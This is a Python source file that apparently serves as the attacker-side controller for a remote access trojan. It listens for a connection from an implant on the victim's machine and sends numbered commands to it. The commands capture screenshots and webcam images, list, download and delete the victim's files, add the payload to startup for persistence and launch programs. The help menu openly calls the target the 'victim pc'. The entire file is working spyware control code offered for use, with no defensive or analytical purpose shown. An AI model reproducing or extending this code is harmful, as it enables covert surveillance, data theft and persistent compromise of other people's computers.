import os
import socket
s = socket.socket()
host= "0.0.0.0"
port= 80
s.bind((host,port))
print("waiting for connection")
s.listen(1)
connect, addr = s.accept()
print("connected")
print("type help for command list")
while True:
    command = input(str("Type a number >> "))

    if command == "1":
        connect.send(command.encode())
        print("command sent")
        print("")
        print("done")
        files = connect.recv(5000)
        files = files.decode()
        print("output : ", files)
    elif command == "2":
        connect.send(command.encode())
        dir_input = input(str("input dir: "))
        connect.send(dir_input.encode())
        files = connect.recv(6000)
        files = files.decode()
        print(files)
    elif command == "3":
        connect.send(command.encode())
        file = connect.recv(1000000000)
        snapcam = open("steath.jpg", "wb")
        snapcam.write(file)
        snapcam.close()
    elif command == "4":
        connect.send(command.encode())
        filepath = input(str("input the path to file:  "))
        connect.send(filepath.encode())
        file = connect.recv(1000000000)
        filename = input(str("pls rename file:  "))
        newsteath = open(filename, "wb")
        newsteath.write(file)
        newsteath.close()
        print("file is saved")
    elif command == "5":
        connect.send(command.encode())
        filepath = input(str("input the path to file:  "))
        connect.send(filepath.encode())
        print("removed")
    elif command == "6":
        connect.send(command.encode())
        print("killed spy")
    elif command == "7":
        connect.send(command.encode())
        file = connect.recv(100000000)
        snapcam = open("webcam.jpg", "wb")
        snapcam.write(file)
        snapcam.close()
    elif command == "8":
        connect.send(command.encode())
        print("pls type the current path to this payload")
        print("")
        PATH = input(str("path to payload:"))
        connect.send(PATH.encode())
        print("Done")
    elif  command == "9":
        connect.send(command.encode())
        apppath = input(str("input path including file: "))
        connect.send(apppath.encode())
    elif command == "help":
        print("")
        print("1) view the current dir ")
        print("2) view the custom dir")
        print("3) take screenshot of victim pc")
        print("4) download file from victim ")
        print("5) remove file from victim")
        print("6) kill (kill spy)")
        print("7) take webcam ")
        print("8) add to start up (hint:you should check for the current dir (number 1) first before using this command) ")
        print("9) start an app/file")
        print("")

    else:
       print("lol")
